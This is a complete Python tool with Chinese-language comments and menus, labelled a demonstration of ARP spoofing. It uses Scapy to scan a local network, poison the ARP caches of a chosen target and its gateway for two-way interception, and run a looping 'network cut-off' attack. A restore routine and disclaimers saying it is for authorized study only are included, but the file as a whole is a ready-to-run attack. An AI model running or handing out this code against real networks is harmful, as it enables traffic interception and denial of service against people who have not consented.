#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ARP欺骗攻击演示程序
仅供学习和安全测试使用

功能：
1. 基本的ARP欺骗攻击
2. 双向ARP欺骗（目标↔网关）
3. 自动恢复ARP表
4. 网络扫描功能

警告：仅在授权环境中使用！
"""

import os
import sys
import time
import socket
import subprocess
from scapy.all import ARP, Ether, srp, send, get_if_hwaddr, conf

class ARPSpoofDemo:
    def __init__(self):
        self.target_ip = None
        self.gateway_ip = None
        self.interface = None
        self.is_attacking = False
        
    def get_local_ip(self):
        """获取本机IP地址"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "192.168.1.100"  # 默认IP
    
    def scan_network(self, ip_range="192.168.1.0/24"):
        """扫描局域网内的活跃设备"""
        print(f"[+] 正在扫描网络 {ip_range}...")
        
        # 创建ARP请求包
        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp
        
        try:
            result = srp(packet, timeout=3, verbose=False)[0]
            
            devices = []
            for sent, received in result:
                devices.append({'ip': received.psrc, 'mac': received.hwsrc})
            
            print(f"[+] 发现 {len(devices)} 个活跃设备:")
            for i, device in enumerate(devices, 1):
                print(f"    {i}. IP: {device['ip']} - MAC: {device['mac']}")
            
            return devices
        except Exception as e:
            print(f"[-] 扫描失败: {e}")
            return []
    
    def get_mac(self, ip):
        """获取指定IP的MAC地址"""
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp
        
        try:
            result = srp(packet, timeout=3, verbose=False)[0]
            return result[0][1].hwsrc
        except:
            return None
    
    def spoof(self, target_ip, gateway_ip):
        """发送ARP欺骗包"""
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)
        
        if not target_mac or not gateway_mac:
            print("[-] 无法获取MAC地址，请检查IP是否正确")
            return False
        
        # 告诉目标：我是网关
        packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        
        # 告诉网关：我是目标
        packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        
        try:
            send(packet1, verbose=False)
            send(packet2, verbose=False)
            return True
        except Exception as e:
            print(f"[-] 发送ARP包失败: {e}")
            return False
    
    def restore(self, target_ip, gateway_ip):
        """恢复ARP表"""
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)
        
        if target_mac and gateway_mac:
            # 恢复目标的ARP表
            packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                         psrc=gateway_ip, hwsrc=gateway_mac)
            
            # 恢复网关的ARP表
            packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, 
                         psrc=target_ip, hwsrc=target_mac)
            
            send(packet1, count=3, verbose=False)
            send(packet2, count=3, verbose=False)
            print("[+] ARP表已恢复")
    
    def start_attack(self, target_ip, gateway_ip, duration=60):
        """开始ARP欺骗攻击"""
        print(f"\n[+] 开始ARP欺骗攻击")
        print(f"    目标IP: {target_ip}")
        print(f"    网关IP: {gateway_ip}")
        print(f"    持续时间: {duration}秒")
        print("    按 Ctrl+C 停止攻击\n")
        
        self.is_attacking = True
        sent_packets = 0
        
        try:
            start_time = time.time()
            
            while self.is_attacking:
                if self.spoof(target_ip, gateway_ip):
                    sent_packets += 2  # 每次发送2个包
                    print(f"\r[+] 已发送 {sent_packets} 个ARP欺骗包", end="", flush=True)
                
                # 检查是否超时
                if time.time() - start_time > duration:
                    print("\n[+] 攻击时间到，自动停止")
                    break
                    
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n[+] 用户中断攻击")
        finally:
            self.stop_attack(target_ip, gateway_ip)
    
    def stop_attack(self, target_ip, gateway_ip):
        """停止攻击并恢复网络"""
        if self.is_attacking:
            print("\n[+] 正在停止攻击并恢复网络...")
            self.is_attacking = False
            self.restore(target_ip, gateway_ip)
            print("[+] 攻击已停止")
    
    def demo_simple_arp(self):
        """演示最简单的ARP欺骗"""
        print("\n=== 极简ARP断网演示 ===")
        
        # 使用默认的测试IP
        TARGET_IP = "192.168.1.100"
        GATEWAY_IP = "192.168.1.1"
        
        print(f"目标IP: {TARGET_IP}")
        print(f"网关IP: {GATEWAY_IP}")
        print("按 Ctrl+C 停止演示\n")
        
        packet_count = 0
        try:
            while True:
                # 告诉目标：我是网关
                arp = ARP(op=2, psrc=GATEWAY_IP, pdst=TARGET_IP)
                send(arp, verbose=False)
                packet_count += 1
                print(f"\r已发送 {packet_count} 个ARP欺骗包", end="", flush=True)
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n演示结束")

def main():
    """主函数"""
    print("=" * 60)
    print("         ARP欺骗攻击演示程序")
    print("        仅供学习和安全测试使用")
    print("=" * 60)
    
    # 重要警告
    print("\n⚠️  重要警告：")
    print("1. 仅在您拥有完全控制权的测试环境中使用")
    print("2. 未经授权使用属于违法行为")
    print("3. 可能违反网络安全法规")
    
    confirm = input("\n是否继续？(y/N): ").lower()
    if confirm != 'y':
        print("程序已退出")
        return
    
    arp = ARPSpoofDemo()
    
    while True:
        print("\n" + "=" * 40)
        print("1. 网络扫描（发现活跃设备）")
        print("2. 极简ARP断网演示")
        print("3. 完整ARP欺骗攻击")
        print("4. 退出")
        print("=" * 40)
        
        choice = input("请选择功能 (1-4): ").strip()
        
        if choice == '1':
            ip_range = input("输入要扫描的IP段 (默认: 192.168.1.0/24): ") or "192.168.1.0/24"
            arp.scan_network(ip_range)
            
        elif choice == '2':
            arp.demo_simple_arp()
            
        elif choice == '3':
            target_ip = input("输入目标IP: ").strip()
            gateway_ip = input("输入网关IP: ").strip()
            duration = input("输入攻击持续时间(秒，默认60): ").strip()
            
            if not duration:
                duration = 60
            else:
                duration = int(duration)
            
            if target_ip and gateway_ip:
                arp.start_attack(target_ip, gateway_ip, duration)
            else:
                print("[-] IP地址不能为空")
                
        elif choice == '4':
            print("程序已退出")
            break
            
        else:
            print("[-] 无效选择")

if __name__ == "__main__":
    # 检查权限
    if os.name == 'nt':  # Windows
        try:
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("[-] 需要管理员权限运行此程序")
                print("[-] 请以管理员身份运行PowerShell或CMD")
                sys.exit(1)
        except:
            pass
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n程序被用户中断")
    except Exception as e:
        print(f"\n[-] 程序出错: {e}")
        print("[-] 请检查网络连接和权限")